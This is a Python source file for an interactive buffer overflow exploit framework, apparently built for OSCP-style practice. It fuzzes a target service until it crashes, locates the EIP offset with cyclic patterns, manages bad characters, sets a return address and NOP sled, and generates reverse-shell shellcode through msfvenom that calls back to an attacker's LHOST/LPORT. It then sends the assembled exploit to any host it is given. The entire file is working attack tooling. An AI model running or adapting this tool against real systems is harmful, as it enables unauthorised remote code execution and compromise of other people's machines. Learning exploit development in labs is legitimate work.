#!/usr/bin/env python3

"""
    ** TODO **
    - Port over old commands
    - Output exploit to file
"""

#####################
#      IMPORTS      #
#####################
import os
import sys
import cmd2
import time
import textwrap
import subprocess

# For interactive mode
from io import StringIO

## PWNTOOLS ##
os.environ['PWNLIB_NOTERM'] = '1' # Don't break cmd2
import pwn

####################
#### MISC SETUP ####
####################

## COLORED SETUP ##
from colored import fg, bg, attr

# COLORED DEFAULTS #
red = fg('red')
blue = fg('blue')
reset = attr('reset')
bold = attr('bold')

## RICH SETUP ##
import rich
from rich import print
from rich.pretty import Pretty
from rich.markup import escape
from rich.panel import Panel
from rich.text import Text

## CMD2 SETUP ##
from cmd2 import Cmd2ArgumentParser, with_argparser, with_category

#####################
#     ARGUMENTS     #
#####################
argparser = Cmd2ArgumentParser(description='A generic bufferoverflow framework.')
argparser.add_argument('host', help='The target host')
argparser.add_argument('port', nargs='?', help='The target port', default=None)
argparser.add_argument('encoding', nargs='?', help='Standard output encoding', metavar='str', default='utf-8')
argparser.add_argument('-a', '--arch', help='The CPU archetype', metavar='str', dest='archetype', default='i386')
argparser.add_argument('-os', '--system', help='The target OS', metavar='str', dest='system', default='windows')
argparser.add_argument('-f','--file', help='Host is a file', action='store_true')
argparser.add_argument('-t', help='Timeout in seconds', metavar='seconds', dest='timeout', default=3)

#####################
#    CONNECTIONS    #
#####################
args = argparser.parse_args()
OS = args.system
ARCH = args.archetype
HOST = str(args.host)
PORT = args.port and abs(int(args.port))
TIMEOUT = abs(int(args.timeout))
ENCODING = args.encoding

## PWNTOOLS SETUP ##
pwn.context.update({
    'os': OS,
    'arch': ARCH, 
    'timeout': TIMEOUT
})

## UTILITY ##
def encode(str, encoding=ENCODING):
    """Convert string to bytes"""
    return str.encode(encoding)

def decode(bts, encoding=ENCODING):
    """Convert bytes to string"""
    return bts.decode(encoding)

def unescape(str, encoding='unicode_escape'):
    """Escape string, return as string"""
    return decode(str, encoding)

def raw_unescape(str, encoding='raw_unicode_escape', decoding='unicode_escape'):
    """Escape string, return as bytes"""
    return encode(unescape(str, decoding), encoding)

def byte_check(str, encoding=ENCODING):
    if (type(str) != bytes):
        return raw_unescape(encode(str, encoding))
    return str # return if already bytes

def get_connection(timeout=TIMEOUT):
    """Get a connection to the process/server"""
    if (args.file):
        return pwn.process(HOST, timeout=timeout)
    else:
        return pwn.remote(HOST, PORT, timeout=timeout)

def interactive(self, conn, term_time=TIMEOUT, conn_time=TIMEOUT):
    """A jank interactive mode implementation"""
    ignore = False # Ignore on error or returned output
    while True:
        # Check conn
        if (not ignore and not conn.can_recv(conn_time)):
            print('[bold red]The server appears to have crashed.[/]')
            return

        # Reset ignore
        if ignore:
            print('[bold red]Skipped sending data.[/]')
        ignore = False

        # Devour excess
        print(decode(conn.recvrepeat(term_time)), end='')

        cmd = self.read_input(
            fg("red")+'$ '+reset, # Prompt
            history=self.interactive_history,
            completion_mode=cmd2.CompletionMode.CUSTOM,
            choices=['help', 'quit']
        )

        self.interactive_history.append(cmd) # Update history
        stripCmd = cmd.strip()
        if (stripCmd == 'exit') or (stripCmd == 'quit') or (stripCmd == 'q'):
            return
        elif stripCmd == 'help':
            print(Panel.fit(textwrap.dedent('''
                Prefix commands with `!` to ignore commands.
                Type exit, quit, or q to exit interactive mode.
                Type eval to run python code.
            '''), title='Help', title_align='left'))
            ignore = True # No need to reconnect after command
        elif cmd.startswith('!'):
            conn.sendline(encode(cmd[1:]))
        elif cmd.startswith('eval'):
            # Error and attached output
            error, err_obj = False, None
            outputForHacker = None

            old_stdout = sys.stdout # Track eval stdout
            sys.stdout = mystdout = StringIO()

            try:
                outputForHacker = eval(cmd[5:])
            except Exception as e:
                error, err_obj = True, e
            
            sys.stdout = old_stdout # Fix stdout
            if (outputForHacker != None and not error): # Returned output to display
                print(outputForHacker)
            elif (not error): # Send data to server
                output = mystdout.getvalue()
                conn.sendline(encode(output))
                continue # Skip ignore
            else: # An error occured
                print(rich.inspect(err_obj))

            ignore = True # An error or output was returned

        else:
            conn.sendline(encode(cmd))


class Overflow(cmd2.Cmd):
    #######################
    #         CMD         #
    #######################
    remote_prompt = '{red}{bold}({HOST}, {PORT}){reset} {blue}=>{reset} '
    file_prompt = '{red}{bold}`{HOST}`{reset} {blue}=>{reset} '
    intro = f'{fg("blue")}Welcome to the bufferoverflow exploit developer.{reset}'
    interactive_history=[]
    #######################
    #                     #
    #######################

    #########################
    #       OVERFLOW        #
    #########################
    data        = b''
    prefix      = b''
    offset      = 0             # The EIP offset
    retn        = b''           # The return address
    banner      = b''           # The service banner
    padding     = b'\x90'*200   # Encoding padding
    pattern     = b''           # Generated pattern
    badchars    = b'\x00'       # Bad characters
    payload     = b''           # The shellcode payload
    #########################
    #                       #
    #########################

    def __init__(self):
        if (args.file):
            self.prompt = self.file_prompt.format(HOST=HOST, red=red, blue=blue, bold=bold, reset=reset)
        else:
            self.prompt = self.remote_prompt.format(HOST=HOST, PORT=PORT,red=red, blue=blue, bold=bold, reset=reset)

        #self.use_rawinput = False
        super().__init__(allow_cli_args=False, include_ipy=True, persistent_history_file=f'OVERFLOW-{HOST}:{PORT}')
        self.self_in_py = True

    def getPrefix(self):
        return self.prefix

    """
    =======================
        FUZZING SECTION
    =======================
    """
    fuzz_parser = Cmd2ArgumentParser()
    fuzz_parser.add_argument('prefix', nargs='?', help='The fuzzing prefix', default=None)
    fuzz_parser.add_argument('encoding', nargs='?', help='Payload output encoding', metavar='int', default=ENCODING)
    fuzz_parser.add_argument('-c', help='Fuzzing character', metavar='char', dest='char', default='A')
    fuzz_parser.add_argument('-s', help='Counter start', metavar='int', dest='start', default=100)
    fuzz_parser.add_argument('-i', help='Counter increment', metavar='int', dest='increment', default=100)
    fuzz_parser.add_argument('-t', help='Timeout in seconds', metavar='int', dest='timeout', default=TIMEOUT)
    fuzz_parser.add_argument('--sleep', help='The time is seconds between sending', metavar='int', dest='sleep', default=1)
    fuzz_parser.add_argument('--no-banner', help='Don\'t grab banner', dest='banner', action='store_false')

    @with_argparser(fuzz_parser)
    @with_category('FUZZER')
    def do_fuzz(self, args):
        '''Fuzz the target'''

        ## TYPE CHECKS ##
        args.prefix = byte_check(args.prefix or self.prefix, args.encoding)
        args.char = byte_check(args.char, args.encoding)
        print(args.prefix, self.prefix)

        ## VARIABLES ##
        global payload

        char = args.char
        prefix = args.prefix
        sleep = abs(int(args.sleep))
        counter = abs(int(args.start))
        timeout = abs(int(args.timeout))
        increment = int(args.increment) 
        grabBanner = args.banner

        while True: 
            ## CONNECT ##
            with get_connection(timeout=timeout) as conn:
                # Grab banner
                if (grabBanner):
                    print(conn.recv(1024))

                # Maybe loop texts (digest extras bs)
                
                # Payload
                payload = char * counter

                # Send
                print('[+] Sending %s bytes...' % len(payload))
                conn.send(prefix+b' '+payload+b'\r\n')

                # Consume response | Will timeout/error if crashed
                if (not conn.can_recv(timeout)):
                    print('[-] Fuzzer crashed at %s bytes!' % len(payload))
                    break
                
                print(conn.recv(1024))
                print('[+] Done...')

                counter += increment

            time.sleep(sleep)


    """
    =======================
        EXPLOIT SECTION
    =======================

    ----------------------
    ----------------------
        GET FUNCTIONS
    ----------------------
    ----------------------
    """
    def exploit_getPattern(self, length, extend=400):
        try:
            __pattern = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb','-l', str(length+extend)])
        except Exception as e:
            print('[!] Could not create pattern!')
            print(e)

        self.pattern = __pattern

        return __pattern

    
    def exploit_getOffset(self, pattern, reverse=True):
        if (type(pattern) != bytes):
            print(f'\Error: getOffset -> Pattern not bytes `{pattern}`')
            return

        self.offset = self.pattern.find(pattern[::-1] if reverse else pattern)
        return self.offset

    
    def exploit_getData(self, prefix=prefix, fuzz=b'', char=b'A'):
        if (self.data):
            return self.data
            
        if (fuzz != b''):
            return prefix + fuzz + self.retn + self.padding + self.payload
        else:
            return prefix + char*self.offset + self.retn + self.padding + self.payload

    
    def exploit_getPadding(self, length, data=b'\x90'):
        self.padding = data * length
        return self.padding

    
    def exploit_getPayload(self, LHOST=None, LPORT=None, msfpayload=f'{OS}/shell_reverse_tcp', form='raw', exitfunc='thread', args=[], metasploit=True):
        try:
            if (metasploit):
                output = subprocess.check_output(['msfvenom', '-p', msfpayload, f'LHOST={LHOST}', f'LPORT={LPORT}', f'EXITFUNC={exitfunc}', '-b', self.exploit_escapedBadChars(), '-f', form]+args)
                self.payload = output
                return self.payload
            else:
                if (OS == 'windows'):
                    print('[bold red]!! Pwntools does not support windows yet.[/]')
                
                print('[bold red]!! This has not implemented yet. (Not needed for OSCP)[/]')

        except Exception as e:
            print('[!] Could not generate payload!')
            print(e)

    

    """
    ----------------------
    ----------------------
        SET FUNCTIONS
    ----------------------
    ----------------------
    """
    
    def exploit_setOffset(self, offset):
        self.offset = int(offset)
        return self.offset
        
    
    def exploit_setReturn(self, retn, reverse=True):
        if (type(retn) != bytes):
            print(f'\Error: setReturn -> Return not bytes `{retn}`')
            return

        self.retn = retn[::-1] if reverse else retn
        return self.retn
        

    """
    ----------------------
    ----------------------
        BAD CHARACTERS
    ----------------------
    ----------------------
    """
    def exploit_getAllChars(self, ignoreBadChars=True, excluding=b''):
        __allchars = b''

        for k in range(len(excluding)):
            char = excluding[k]
            if (type(char) != bytes):
                print(f'\t[!] Error: getAllChars -> Char not bytes `{char}`')
                return

        badchararray = bytearray(self.badchars)
        for x in range(1, 256):
            __new = bytearray([x])
            if ((ignoreBadChars and (__new in badchararray)) or (__new in excluding)):
                continue
            
            __allchars += __new
        
        return __allchars

    
    def exploit_charsToPayload(self, ignoreBadChars=True, excluding=b''):
        self.payload = self.exploit_getAllChars(ignoreBadChars=ignoreBadChars, excluding=excluding)
        return self.payload

    
    def exploit_addBadChars(self, char):
        if (type(char) != bytes):
            print(f'\t[!] Error: addBadChars -> Char not bytes `{char}`')
            return

        self.badchars += char
        return self.badchars    
        
    
    def exploit_removeBadChars(self, char):
        if (type(char) != bytes):
            print(f'\t[!] Error: removeBadChars -> Char not bytes `{char}`')
            return

        self.badchars = self.badchars.replace(char, b'')
        return self.badchars

    
    def exploit_resetBadChars(self):
        __badchars = b'\x00'

        self.badchars = __badchars
        return self.badchars

    
    def exploit_escapedBadChars(self):
        __escaped = ''
        for x in self.badchars:
            __escaped += '\\x%.2x' % x

        return __escaped

    """
    ----------------------
    ----------------------
        DATA FUNCTIONS
    ----------------------
    ----------------------
    """
    
    def exploit_fullSend(self, prefix=prefix, fuzz=b'', char=b'A', suffix=b'', preloop=0, digest=0, grabbanner=True, decode=ENCODING, timeout=TIMEOUT):
        if (type(prefix) != bytes):
            print(f'\t[!] Error: fullSend -> Prefix not bytes `{prefix}`')
            return

        if (type(fuzz) != bytes):
            print(f'\t[!] Error: fullSend -> Fuzz not bytes `{fuzz}`')
            return

        if (type(suffix) != bytes):
            print(f'\t[!] Error: fullSend -> Suffix not bytes `{suffix}`')
            return

        return self.exploit_send(self.exploit_getData(prefix=prefix, fuzz=fuzz, char=char) + suffix, preloop=preloop, prefix=prefix, digest=digest, grabbanner=grabbanner, decode=decode, timeout=timeout)
    
    
    def exploit_sendPattern(self, length, extend=400, prefix=prefix, preloop=0, digest=0, grabbanner=True, old=False, show=True, decode=ENCODING, timeout=TIMEOUT):
        if (type(prefix) != bytes):
            print(f'\t[!] Error: sendPattern -> Prefix not bytes {prefix}')
            return

        __pattern = (old and self.pattern) or self.exploit_getPattern(length, extend=extend)
        if (show and not old):
            print('Pattern:', __pattern.decode(decode) if decode else __pattern)
        return self.exploit_send(prefix + __pattern, preloop=preloop, prefix=prefix, digest=digest, grabbanner=grabbanner, decode=decode, timeout=timeout)
        
    
    def exploit_send(self, data, preloop=0, digest=0, prefix=prefix, grabbanner=True, decode=ENCODING, timeout=TIMEOUT):
        if (type(data) != bytes):
            print(f'\t[!] Error: send -> Data not bytes `{data}`')
            return
        
        if (type(prefix) != bytes):
            print(f'\t[!] Error: send -> Prefix not bytes `{prefix}`')
            return

        with get_connection(timeout=timeout) as conn:
            if (grabbanner):
                print(conn.recv(1024))        # Get the banner
            
            # Absorb useless input and responses
            digest = abs(digest)
            preloop = abs(preloop)
            counter = 0
            while True:
                if (counter > (digest + preloop)):
                    break  
                
                if (counter < preloop):
                    conn.send(prefix)

                if (counter < digest):
                    conn.recv(1024)

                counter += 1

            print('[+] Sending %s bytes...' % len(data))
            conn.send(data + b'\n')

            # Consume response | Will timeout/error if crashed
            if (not conn.can_recv(timeout)):
                print('[-] Send crashed at %s bytes!' % len(data))
                return

            response = conn.recv(1024)
            print('[+] Done...')
            
            if (decode):
                return response.decode(decode)
            return response
        

    """
    ========================
    ------------------------
        EXPLOIT COMMANDS
    ------------------------
    ========================
    """
    # Useable commands for exploit api

    #
    #   COMMANDS:
    #   CHANGING VARIABLES
    #

    #   SECTION:
    #   GET FUNCTIONS

    data_parser = Cmd2ArgumentParser()
    data_parser.add_argument('data', nargs='?', help='Override all properties and set', default=None)
    data_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    data_parser.add_argument('--clear', help='Unset override', action='store_true')

    @with_argparser(data_parser)
    @with_category('EXPLOIT')
    def do_data(self, args):
        """Get the entire structure"""
        if (args.clear):
            self.data = b''
            return print('[bold red]Data override is disabled.[/]')
        if (args.data):
            self.data = raw_unescape(args.data, args.encoding)
            print('[bold green]Data override is enabled.[/]')

        print(self.exploit_getData())
    
    padding_parser = Cmd2ArgumentParser() 
    padding_parser.add_argument('length', nargs='?', help='The prefix string', default=None)
    padding_parser.add_argument('char', nargs='?', help='The character to use as padding. (Default: \\x90)', default='\x90')
    padding_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)

    @with_argparser(padding_parser)
    @with_category('EXPLOIT')
    def do_padding(self, args):
        """Get/Set the padding"""
        if (args.length == None):
            return print(self.padding)

        args.char = byte_check(args.char, args.encoding)
        print(self.exploit_getPadding(abs(int(args.length)), args.char))

    payload_parser = Cmd2ArgumentParser()
    payload_parser.add_argument('LHOST', nargs='?', help='The IP/interface on the attacker', default=None)
    payload_parser.add_argument('LPORT', nargs='?', help='The port on the attacker')
    payload_parser.add_argument('-p','--payload', help='msfvenom payload', default=f'{OS}/shell_reverse_tcp')
    payload_parser.add_argument('-f','--func','--exitfunc', help='The exploit\'s exitfunc.', default='thread')
    # Could also change forms, but... It'd be pointless, we go raw baby
    # Also, could allow additional commandline args (change encoding, etc.)... Maybe later.

    @with_argparser(payload_parser)
    @with_category('EXPLOIT')
    def do_payload(self, args):
        """Get/Set the payload"""
        if (args.LHOST == None):
            return print(self.payload)

        if (args.LPORT == None):
            return print('[bold red]Missing required argument LPORT')

        print(self.exploit_getPayload(LHOST=args.LHOST, LPORT=args.LPORT, msfpayload=args.payload, exitfunc=args.func))


    #   SECTION:
    #   Get/SET FUNCTIONS

    encoding_parser = Cmd2ArgumentParser()
    encoding_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=None)

    @with_argparser(encoding_parser)
    @with_category('EXPLOIT')
    def do_encoding(self, args):
        """Get/Set the encoding"""
        global ENCODING
        if (args.encoding == None):
            return print(ENCODING)

        ENCODING = args.encoding
        print(ENCODING)

    prefix_parser = Cmd2ArgumentParser() 
    prefix_parser.add_argument('prefix', nargs='?', help='The prefix string', default=None)
    prefix_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)

    @with_argparser(prefix_parser)
    @with_category('EXPLOIT')
    def do_prefix(self, args):
        """Get/Set the current command prefix"""

        if (args.prefix == None):
            return print(self.prefix)

        ## TYPE CHECKS ##
        args.prefix = byte_check(args.prefix, args.encoding)

        if (args.prefix[len(args.prefix)-1:] != b' '):
            print('[bold red]You may have forgotten a space.[/]')

        self.prefix = args.prefix
        print(self.prefix)

    offset_parser = Cmd2ArgumentParser()
    offset_parser.add_argument('offset', nargs='?', help='The return address', default=None)
    offset_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    offset_parser.add_argument('-f', '--find', help='Change offset to found pattern', default=None)
    offset_parser.add_argument('-r','--reverse', help='Change endianness (Default: Little Endian)', dest='reverse', action='store_false')


    @with_argparser(offset_parser)
    @with_category('EXPLOIT')
    def do_offset(self, args):
        """Get/Set the return address offset"""
        if (args.offset == None and args.find == None):
            return print(self.offset)

        if (args.find):
            args.find = byte_check(args.find, args.encoding)
            return print(self.exploit_getOffset(args.find, reverse=args.reverse))

        print(self.exploit_setOffset(int(args.offset)))

    return_parser = Cmd2ArgumentParser()
    return_parser.add_argument('retn', nargs='?', help='The return address', default=None)
    return_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    return_parser.add_argument('-r','--reverse', help='Change endianness (Default: Little Endian)', dest='reverse', action='store_false')

    @with_argparser(return_parser)
    @with_category('EXPLOIT')
    def do_return(self, args):
        """Get/Set the return address"""
        if (args.retn == None):
            return print(self.retn)

        args.retn = byte_check(args.retn, args.encoding)
        print(self.exploit_setReturn(args.retn, reverse=args.reverse))

    #   SECTION:
    #   BAD CHARACTERS

    getAllChars_parser = Cmd2ArgumentParser() # Args for ignoreBadChars, eclude
    getAllChars_parser.add_argument('excluding', nargs='?', help='Bad characters to exclude', default='')
    getAllChars_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    getAllChars_parser.add_argument('-s', '--show', help='Don\'t ignore bad characters', dest='show', action='store_false')

    @with_argparser(getAllChars_parser)
    @with_category('EXPLOIT')
    def do_getAllChars(self, args):
        """Generate bytes for all ascii characters"""
        args.excluding = byte_check(args.excluding, args.encoding)
        print(self.exploit_getAllChars(ignoreBadChars=args.show, excluding=args.excluding))

    charsToPayload_parser = Cmd2ArgumentParser() # Args for ignoreBadChars, eclude
    charsToPayload_parser.add_argument('excluding', nargs='?', help='Bad characters to exclude', default='')
    charsToPayload_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    charsToPayload_parser.add_argument('-s', '--show', help='Don\'t ignore bad characters', dest='show', action='store_false')

    @with_argparser(charsToPayload_parser)
    @with_category('EXPLOIT')
    def do_charsToPayload(self, args):
        """Set payload to getAllChars"""
        args.excluding = byte_check(args.excluding, args.encoding)
        print(self.exploit_charsToPayload(ignoreBadChars=args.show, excluding=args.excluding))

    badchars_parser = Cmd2ArgumentParser()
    badchars_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    badchars_parser.add_argument('-a','--add', help='String of character(s) to add', default=None)
    badchars_parser.add_argument('-r','--remove', help='String of character(s) to remove', default=None)
    badchars_parser.add_argument('-e','--escape', help='Output escaped bad chars', action='store_true')
    badchars_parser.add_argument('--reset', help='Reset bad chars', action='store_true')

    @with_argparser(badchars_parser)
    @with_category('EXPLOIT')
    def do_badchars(self, args):
        """Get bad chars"""
        if (args.add):
            args.add = byte_check(args.add, args.encoding)
            self.exploit_addBadChars(args.add)

        if (args.remove):
            args.remove = byte_check(args.remove, args.encoding)
            self.exploit_removeBadChars(args.remove)

        if (args.reset):
            self.exploit_resetBadChars()

        if (args.escape):
            print(self.exploit_escapedBadChars())
        else:
            print(self.badchars)

    #
    #   COMMANDS:
    #   SENDING DATA
    #

    fullSend_parser = Cmd2ArgumentParser()
    fullSend_parser.add_argument('prefix', nargs='?', help='The prefix string', default=None)
    fullSend_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    fullSend_parser.add_argument('-o', help='Show output', dest='out', action='store_true')
    fullSend_parser.add_argument('-e', '--encode', help='Output as bytes', action='store_false')
    fullSend_parser.add_argument('-c', help='Fuzzing character', metavar='char', dest='char', default='A')
    fullSend_parser.add_argument('-s', help='Fuzzing padding after payload', metavar='char', dest='suffix', default='')
    fullSend_parser.add_argument('-t', help='Timeout in seconds', metavar='seconds', dest='timeout', default=TIMEOUT)
    fullSend_parser.add_argument('--prepad', help='Fuzzing padding before ret address', metavar='char', dest='fuzz', default='')
    fullSend_parser.add_argument('--preloop', help='Send the prefix <number> times before the data', metavar='number', dest='preloop', default=0)
    fullSend_parser.add_argument('--digest', help='Eat <number> responses between sending data', metavar='number', dest='digest', default=0)
    fullSend_parser.add_argument('--no-banner', help='Don\'t grab banner', dest='banner', action='store_false')

    @with_argparser(fullSend_parser)
    @with_category('EXPLOIT')
    def do_exploit(self, args):
        """Send constructed payload to server"""

        ## TYPE CHECKS ##
        args.prefix = byte_check(args.prefix or self.prefix, args.encoding)
        args.char = byte_check(args.char, args.encoding)
        args.fuzz = byte_check(args.fuzz, args.encoding)
        args.suffix = byte_check(args.suffix, args.encoding)
        timeout = abs(int(args.timeout))
        preloop = abs(int(args.preloop))
        digest = abs(int(args.digest))

        # Construct and send
        output = self.exploit_fullSend(prefix=args.prefix, fuzz=args.fuzz, char=args.char, suffix=args.suffix, preloop=preloop, digest=digest, grabbanner=args.banner,decode=(args.out and (args.encode and args.encoding or '')), timeout=timeout)
        
        # Display output
        if (args.out):
            print(output)
    
    pattern_parser = Cmd2ArgumentParser()
    pattern_parser.add_argument('length', nargs='?', help='The length of the pattern', default=None)
    pattern_parser.add_argument('prefix', nargs='?', help='The prefix string', default=None)
    pattern_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    pattern_parser.add_argument('-o', help='Hide output', dest='out', action='store_false')
    pattern_parser.add_argument('-e', '--encode', help='Output as bytes', action='store_false')
    pattern_parser.add_argument('-t', help='Timeout in seconds', metavar='seconds', dest='timeout', default=TIMEOUT)
    pattern_parser.add_argument('--preloop', help='Send the prefix <number> times before the data', metavar='number', dest='preloop', default=0)
    pattern_parser.add_argument('--digest', help='Eat <number> responses between sending data', metavar='number', dest='digest', default=0)
    pattern_parser.add_argument('-c', '--current', '--old', help='Output current pattern', dest='old', action='store_true')
    pattern_parser.add_argument('-s', '--send', help='Send pattern to server', dest='send', action='store_true')
    pattern_parser.add_argument('--extend', help='Padding appended to the end', default=400)
    pattern_parser.add_argument('--no-banner', help='Don\'t grab banner', dest='banner', action='store_false')

    @with_argparser(pattern_parser)
    @with_category('EXPLOIT')
    def do_pattern(self, args):
        """Get/Set/Send a pattern for use in finding an offset to ret"""
        if (args.length == None or (args.old and not args.send)):
            return print(self.pattern)
        
        length = abs(int(args.length))
        extend = abs(int(args.extend))

        if (args.send):
            ## TYPE CHECKS ##
            args.prefix = byte_check(args.prefix or self.prefix, args.encoding)
            timeout = abs(int(args.timeout))
            preloop = abs(int(args.preloop))
            digest = abs(int(args.digest))
            
            output = self.exploit_sendPattern(length, prefix=args.prefix, preloop=preloop, digest=digest, grabbanner=args.banner, old=args.old, show=args.out, decode=(args.encode and args.encoding or ''), timeout=timeout)

            if (args.out):
                print(output)
        else:
            output = self.exploit_getPattern(length, extend=extend)
            if (args.out):
                print(output if not args.encode else output.decode(args.encoding))

    send_parser = Cmd2ArgumentParser() # Args for ignoreBadChars, eclude
    send_parser.add_argument('data', help='Data to send')
    send_parser.add_argument('encoding', nargs='?', help='Standard output encoding', default=ENCODING)
    send_parser.add_argument('-e', '--encode', help='Output as bytes', action='store_false')
    send_parser.add_argument('-t', help='Timeout in seconds', metavar='seconds', dest='timeout', default=TIMEOUT)
    send_parser.add_argument('--preloop', help='Send the prefix <number> times before the data', metavar='number', dest='preloop', default=0)
    send_parser.add_argument('--digest', help='Eat <number> responses between sending data', metavar='number', dest='digest', default=0)
    send_parser.add_argument('--no-banner', help='Don\'t grab banner', dest='banner', action='store_false')

    @with_argparser(send_parser)
    @with_category('EXPLOIT')
    def do_send(self, args):
        """Send arbitrary data to server"""

        ## TYPE CHECKS ##
        args.data = byte_check(args.data, args.encoding)
        timeout = abs(int(args.timeout))
        preloop = abs(int(args.preloop))
        digest = abs(int(args.digest))

        print(self.exploit_send(args.data, timeout=timeout, preloop=preloop, digest=digest, grabbanner=args.banner, decode=(args.encode and args.encoding or '')))

    """
    =======================
         MISC SECTION
    =======================
    """
    interactive_parser = Cmd2ArgumentParser()
    interactive_parser.add_argument('-t', help='Terminal timeout in seconds', metavar='float', dest='term_time', default=0.1)
    interactive_parser.add_argument('-c', help='Connection timeout in seconds', metavar='int', dest='conn_time', default=TIMEOUT)

    # Alias for interactive
    @with_argparser(interactive_parser)
    @with_category('MISC')
    def do_int(self, args):
        term_time = abs(float(args.term_time))
        conn_time = abs(int(args.conn_time))

        with get_connection(timeout=conn_time) as conn:
            interactive(self, conn, term_time=term_time, conn_time=conn_time)

    @with_argparser(interactive_parser)
    @with_category('MISC')
    def do_interactive(self, args):
        term_time = abs(float(args.term_time))
        conn_time = abs(int(args.conn_time))

        with get_connection(timeout=conn_time) as conn:
            interactive(self, conn, term_time=term_time, conn_time=conn_time)

    @with_argparser(Cmd2ArgumentParser())
    @with_category('MISC')
    def do_mona(self, args):
        '''Output mona commands.'''

        print(Panel.fit(textwrap.dedent(f'''
            ## Create working folder ##
            !mona config -set workingfolder C:\\mona\\%p

            ## Create bad chars | Rebase for detection##
            !mona bytearray -b "{self.exploit_escapedBadChars()}"  

            ## Detect bad chars ##
            !mona compare -f C:\\mona\\oscp\\bytearray.bin -a <ESP>

            ## Find jump point ##
            !mona jmp -r esp -cpb "{self.exploit_escapedBadChars()}"    
        '''), title='Mona'))

    @with_argparser(Cmd2ArgumentParser())
    @with_category('MISC')
    def do_output(self, args):
        '''Output python exploit''' 
        pass

    @with_argparser(Cmd2ArgumentParser())
    def do_exit(self, args):   
        '''Exit this application''' 
        return True

    def do_debug(self, args):
        import pdb
        pdb.set_trace();

    def do_q(self, args):   
        '''Exit this application''' 
        return True


if __name__ == '__main__':
    Overflow().cmdloop()